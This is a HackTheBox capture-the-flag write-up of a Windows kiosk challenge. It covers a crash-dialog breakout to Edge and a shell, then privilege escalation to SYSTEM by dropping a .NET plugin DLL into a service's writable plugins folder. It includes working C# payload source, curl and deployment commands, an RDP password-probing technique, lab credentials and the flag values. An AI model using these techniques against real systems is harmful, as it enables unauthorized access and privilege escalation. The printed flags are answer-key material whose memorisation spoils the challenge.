---
doc_kind: writeup
title: "HTB Touch - Kiosk Breakout to SYSTEM via Plugin DLL Hijack"
category: misc
slug: htb-touch-kiosk-plugin-hijack
created: 2026-10-04
status: solved
tags:
  - windows
  - kiosk
  - electron
  - rdp
  - dll-hijack
  - dotnet
  - plugin-loading
  - privesc
  - local-group-acl
source: HackTheBox
target: "Windows kiosk (KIOSK-042), RDP/8443/WinRM"
---
# HTB Touch - Kiosk Breakout to SYSTEM via Plugin DLL Hijack

## Challenge Summary

- Source: HackTheBox
- Target: Windows "Easy" box, airport self-check-in kiosk (`KIOSK-042`). Ports 135, 3389, 5985, 8443.
- Goal: user.txt + root.txt.

## Initial Signals

- Entry point: RDP creds given (`KioskUser` / `K!0sk2026#`), plus a device-panel password (`NX-DH-2024-B7042`) for an HTTP admin panel on 8443 ("Nexion DeviceHub"), plus a red-herring hint (`Jenny Crawford / KS7X2M`).
- Visible hints: full-screen Electron kiosk app ("HTB Airways Self Check-in") on RDP login; an admin web panel controlling simulated scanner/printer hardware.
- First confirming probe: TCP connect scan on 135/3389/5985/8443 (all open); the box's assigned IP had actually changed/expired mid-engagement — always re-verify with `nmap -Pn -sT` before assuming a box is down, ICMP is routinely blocked on HTB.

## Exploit Chain

1. RDP in as `KioskUser`. The hint credential (`jenny` / derived password) was **invalid** — confirmed cheaply without a full GUI session (see Pattern: rdp-password-probe-via-negotiation).
2. Logged into the DeviceHub admin panel (8443) with the given device password. Read the dashboard's inline JS to map the real API (`/api/scanner/power`, `/api/printer/power`, `/api/scan`, `/api/scanner/test-image`, `/api/scanner/settings`, `/login/badge`).
3. Tried the obvious badge-scan path (generate a Code128 barcode for `KS7X2M`, upload via `/api/scanner/test-image`) — kiosk said "Could not read badge barcode". Dead end for that specific puzzle, but the *act* of powering the scanner off via the admin API and then asking the kiosk to scan something caused the real driver app (`NexionDocReader.exe`) to **crash with a native Windows error dialog containing a clickable support hyperlink**. That is the actual breakout.
4. Clicking the hyperlink (via blind RDP automation: `xfreerdp` on a headless `Xvfb` display, `xdotool` for input, `import` for screenshots) launched the default browser (Edge) **outside** the kiosk's locked-down shell.
5. From Edge: read `user.txt` directly via `file:///C:/Users/KioskUser/Desktop/user.txt` — no shell needed yet.
6. Got an interactive shell: `Ctrl+S` → Save-As dialog → click the Downloads folder's "open in Explorer" icon → real Explorer window (not the restricted picker) → address bar to `C:\Windows\System32` → search `cmd.exe` → double-click → `cmd.exe` as `kioskuser`.
7. `whoami /groups` revealed membership in a custom local group `Printer Administrators`, which held **Modify** ACL on `C:\Program Files\Nexion Systems\Printer\publish\plugins\` — a folder read by `NexionPrinter.exe`, running in **Session 0** (service session, effectively SYSTEM).
8. Built a .NET 8 class library whose **root namespace matched the deployed DLL's filename stem** (critical — see Pattern: dotnet-plugin-namespace-must-match-filename). Both a parameterless constructor and a method named `Initialize()` get invoked by the host loader once this convention is respected.
9. Deployed the DLL into the plugins folder, then created `C:\ProgramData\Nexion\printer-restart.trigger` (content `restart`) — a file-watcher-driven reload trigger that gets consumed within seconds and causes the service to re-scan the plugins folder.
10. Payload ran `whoami` + `dir`/`type` on Administrator's Desktop via a companion `.bat` file (to dodge nested-escaping hell) — confirmed `nt authority\system` and exfiltrated `root.txt`.

## Key Evidence

- `tasklist /v` showing `Session Name: Services`, `Session#: 0`, `User Name: Unknown` for a process is a strong SYSTEM/service-context signal even without admin rights to see the real username.
- `icacls <folder>` showing a *non-built-in, non-Administrators* group (discoverable via `whoami /groups`) with `(M)` or `(F)` is the real "can I write here" test — don't assume only `BUILTIN\Administrators` matters.
- Attempting to overwrite a just-deployed plugin DLL and getting `The process cannot access the file because it is being used by another process` **proves the host process loaded it** — a positive signal, not just an obstacle. Rename (`plugin2.dll`, `plugin3.dll`, ...) to keep iterating instead of fighting the lock.

## Dead Ends

- `jenny` / hint-derived RDP password: invalid (confirmed via negotiation-behavior diffing, no need to burn a full GUI session per attempt).
- Code128 barcode of `KS7X2M` fed to the simulated badge scanner: kiosk rejected it ("Could not read badge barcode"). Possibly meant for a different, unrelated kiosk puzzle (not required for user.txt/root.txt).
- First plugin DLL iterations (`namespace Plugin` while the file was `plugin2.dll`/`plugin3.dll`): DLL got loaded (lock-tested), but neither the constructor nor `Initialize()` fired. Root cause only became visible after adding direct file-based logging inside the constructor as a diagnostic (bypassing any reliance on the actual payload working) — this is a generally useful debugging technique for "my code isn't running" situations where you can't see stdout.
- Embedding the whole diagnostic/exploit command chain inline in the C# `Arguments` string (generated itself via a `cmd.exe echo` one-liner) produced unreadable triple-nested escaping and subtle corruption (e.g. `p?` turning into `ec/`). Moving the actual logic into a standalone `.bat` file and having the C# plugin just invoke `cmd /c that.bat` fixed it immediately.

## Payloads And Commands

```bash
# RDP validity probe without a full GUI session (see pattern for detail)
xvfb-run -a rdesktop -u 'USER' -p 'PASS' TARGET_IP
# valid password -> log reaches "process_pdu_logon"
# invalid password -> stalls right after "Retrying with plain RDP."

# Admin panel: crash the scanner driver to pop a dialog with a clickable link
curl -s -b cookies.txt -X POST -H "Content-Type: application/json" \
  -d '{"powered":false}' http://TARGET:8443/api/scanner/power
# then trigger any scan action from the kiosk GUI -> native crash dialog -> click its hyperlink -> full browser

# .NET plugin (namespace MUST equal the deployed DLL filename stem, e.g. plugin7.dll -> namespace plugin7;)
# Class1.cs
using System.Diagnostics;
namespace plugin7;
public class Class1
{
    public Class1() { Run(); }
    public void Initialize() { Run(); }
    private void Run()
    {
        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = @"C:\Windows\System32\cmd.exe",
                Arguments = @"/c C:\Temp\diag.bat",
                CreateNoWindow = true,
                UseShellExecute = false
            });
        }
        catch { }
    }
}

# Plugin.csproj
# <AssemblyName> must match the namespace above
dotnet new classlib -n Plugin --framework net8.0
dotnet build -c Release
copy /y bin\Release\net8.0\plugin7.dll "C:\Program Files\<App>\plugins\plugin7.dll"
echo restart > C:\ProgramData\<Vendor>\printer-restart.trigger
```

## Flag / Outcome

- user.txt: `212d6787ae0c82cc404e1b2de010c116`
- root.txt: `88513c5e29837f01f0911eed290c009c`
- Full write-up exported: `~/Desktop/Touch_Writeup_L&_M@z4rt.{md,pdf}`

## Reusable Lessons

- On HTB, `No route to host` from a previously-working target almost always means the instance expired/reset — ask for (or respawn to get) a fresh IP before digging further; don't assume VPN/routing is broken.
- A native Windows error/crash dialog with a clickable link is a classic, still-effective kiosk escape: find a way to make a background driver/process crash (often via an exposed admin API toggling "device power" or similar), then click through to a real browser.
- Once in a browser inside a locked-down session, `file:///` navigation reads files with no shell, and a Save-As/Open dialog's folder-icon-to-Explorer trick reliably escalates to a full Explorer window, then to `cmd.exe` via search + double-click.
- A custom local group (visible only via `whoami /groups`, not assumed) holding write ACLs on a plugin/extension folder for a service running in Session 0 is a high-value, quiet privesc vector — always check group memberships, not just explicit username ACLs.
- When a dropped payload "does nothing" but you can prove it was loaded (file lock), add the dumbest possible diagnostic (append-to-file in the very first line of the constructor) before suspecting the technique is wrong — it is usually a naming/convention mismatch with the loader, not a broken technique.

## Pattern Candidates

- Existing pattern to update: `rev-unpack-and-trace` / `pwn-canary-and-pie-follow-up` not directly applicable; no existing kiosk/plugin pattern.
- New pattern worth creating: `dotnet-plugin-dll-hijack`, `kiosk-electron-breakout-crash-dialog`, `rdp-password-probe-via-negotiation` — all created alongside this writeup.
